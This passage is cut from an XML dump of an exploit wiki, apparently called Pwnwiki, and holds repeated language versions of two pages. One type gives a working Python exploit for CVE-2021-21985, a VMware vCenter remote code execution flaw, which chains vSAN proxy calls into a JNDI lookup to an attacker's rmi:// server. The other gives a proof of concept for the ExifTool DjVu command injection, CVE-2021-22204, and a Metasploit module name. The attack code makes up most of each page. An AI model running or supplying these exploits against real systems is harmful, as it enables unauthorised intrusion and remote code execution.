      <sha1>eziibdv0ac3sf7kvl0xol94viol65hc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/ru</title>
    <ns>0</ns>
    <id>3509</id>
    <revision>
      <id>4077</id>
      <timestamp>2021-06-05T01:53:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Скриншот =="</comment>
      <origin>4077</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2593" sha1="lx96uzgoth8ixn6giui060wz5z3fdzm" xml:space="preserve">&lt;languages   /&gt;
== Скриншот ==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


== Ссылка ==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>lx96uzgoth8ixn6giui060wz5z3fdzm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/tr</title>
    <ns>0</ns>
    <id>3517</id>
    <revision>
      <id>4085</id>
      <timestamp>2021-06-05T02:05:02Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-21985 VMware vCenter Uzaktan Keyfi Kod Yürütme Güvenlik Açığı"</comment>
      <origin>4085</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2590" sha1="70lknmvhmvgila16bny4b5cetuzpuc5" xml:space="preserve">&lt;languages   /&gt;
==Ekran görüntüsü==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


== Referans ==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>70lknmvhmvgila16bny4b5cetuzpuc5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/uk</title>
    <ns>0</ns>
    <id>3506</id>
    <revision>
      <id>4074</id>
      <timestamp>2021-06-05T01:51:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Знімок екрана =="</comment>
      <origin>4074</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2604" sha1="22z0td3kfyqavqxc8ngvrjgdck019r3" xml:space="preserve">&lt;languages   /&gt;
== Знімок екрана ==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


== Довідка ==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>22z0td3kfyqavqxc8ngvrjgdck019r3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3479</id>
    <revision>
      <id>4047</id>
      <timestamp>2021-06-05T01:43:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-21985 VMware vCenter 远程任意代码执行漏洞"</comment>
      <origin>4047</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2573" sha1="6mzshbqrdu16kc9v1jgfqhln5apfu7m" xml:space="preserve">&lt;languages   /&gt;
==截图==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


==参考==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>6mzshbqrdu16kc9v1jgfqhln5apfu7m</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5080</id>
    <revision>
      <id>5820</id>
      <timestamp>2021-06-24T02:14:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==參考=="</comment>
      <origin>5820</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2573" sha1="om40pjrsyawthcd5flgptw2b623l0dw" xml:space="preserve">&lt;languages   /&gt;
==截圖==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


==參考==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>om40pjrsyawthcd5flgptw2b623l0dw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>2326</id>
    <revision>
      <id>2762</id>
      <timestamp>2021-05-11T09:55:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== ExifTool 7.44 to 12.23   ==POC== &lt;pre&gt;   $ printf 'P1 1 1 0' &gt; moo.pbm    $ cjb2 moo.pbm moo.djvu    $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"..."</comment>
      <origin>2762</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="565" sha1="bznv5ygc4j9orn51rtxuxbg191j1dk6" xml:space="preserve">==影響版本==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>bznv5ygc4j9orn51rtxuxbg191j1dk6</sha1>
    </revision>
    <revision>
      <id>2763</id>
      <parentid>2762</parentid>
      <timestamp>2021-05-11T12:07:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>2763</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="606" sha1="laz3ru38cczbp0rolcvk8w2g3ei92jg" xml:space="preserve">&lt;languages. /&gt;

&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>laz3ru38cczbp0rolcvk8w2g3ei92jg</sha1>
    </revision>
    <revision>
      <id>2764</id>
      <parentid>2763</parentid>
      <timestamp>2021-05-11T12:08:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>2764</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="605" sha1="2ud8rwi5ylr022lmqiciatierq3005h" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>2ud8rwi5ylr022lmqiciatierq3005h</sha1>
    </revision>
    <revision>
      <id>2765</id>
      <parentid>2764</parentid>
      <timestamp>2021-05-11T12:08:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>2765</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="616" sha1="8slwgykzvnfpeuytkrfd8pqv1zzgpuo" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>8slwgykzvnfpeuytkrfd8pqv1zzgpuo</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/af</title>
    <ns>0</ns>
    <id>2737</id>
    <revision>
      <id>3236</id>
      <timestamp>2021-05-23T05:23:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool kwesbaarheid vir arbitrêre uitvoering van kode"</comment>
      <origin>3236</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="592" sha1="qgmz0lyjppi255ei4eq88sijsgtasyf" xml:space="preserve">&lt;languages /&gt;

== Geaffekteerde weergawe ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>qgmz0lyjppi255ei4eq88sijsgtasyf</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/am</title>
    <ns>0</ns>
    <id>2582</id>
    <revision>
      <id>3081</id>
      <timestamp>2021-05-23T02:10:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool የዘፈቀደ ኮድ የማስፈፀም ተጋላጭነት"</comment>
      <origin>3081</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="595" sha1="no0clrx3q1avvynwbgyayef2b9aso86" xml:space="preserve">&lt;languages /&gt;

== የተጠቂው ስሪት ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>no0clrx3q1avvynwbgyayef2b9aso86</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ar</title>
    <ns>0</ns>
    <id>2726</id>
    <revision>
      <id>3225</id>
      <timestamp>2021-05-23T04:05:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== الإصدار المتأثر =="</comment>
      <origin>3225</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="599" sha1="3s0q2dajjp91r56mxeyj4gb0mop2h57" xml:space="preserve">&lt;languages /&gt;

== الإصدار المتأثر ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>3s0q2dajjp91r56mxeyj4gb0mop2h57</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/az</title>
    <ns>0</ns>
    <id>2740</id>
    <revision>
      <id>3239</id>
      <timestamp>2021-05-23T05:57:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Təsirə məruz qalan versiya =="</comment>
      <origin>3239</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="599" sha1="3ck75qxeh1t0dlg3tja6ks96vgp7b1l" xml:space="preserve">&lt;languages /&gt;

== Təsirə məruz qalan versiya ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>3ck75qxeh1t0dlg3tja6ks96vgp7b1l</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/be</title>
    <ns>0</ns>
    <id>2627</id>
    <revision>
      <id>3126</id>
      <timestamp>2021-05-23T02:26:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 Уразлівасць адвольнага выканання кода ExifTool"</comment>
      <origin>3126</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="603" sha1="dzwc6m2aeo1yofi5t959spem3dgpyhj" xml:space="preserve">&lt;languages /&gt;

== Пацярпелая версія ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>dzwc6m2aeo1yofi5t959spem3dgpyhj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/bg</title>
    <ns>0</ns>
    <id>2708</id>
    <revision>
      <id>3207</id>
      <timestamp>2021-05-23T02:53:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool уязвимост при произволно изпълнение на код"</comment>
      <origin>3207</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="601" sha1="m1mzwa4swgderxvs2m6d8pto5v4zf3c" xml:space="preserve">&lt;languages /&gt;

== Засегната версия ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>m1mzwa4swgderxvs2m6d8pto5v4zf3c</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/bn</title>
    <ns>0</ns>
    <id>2716</id>
    <revision>
      <id>3215</id>
      <timestamp>2021-05-23T03:01:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool স্বেচ্ছাসেবক কোড কার্যকর করার দুর্বলতা"</comment>
      <origin>3215</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="616" sha1="2x087zsc9h4tfn74l9r5bg357to4b8k" xml:space="preserve">&lt;languages /&gt;

== প্রভাবিত সংস্করণ ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>2x087zsc9h4tfn74l9r5bg357to4b8k</sha1>
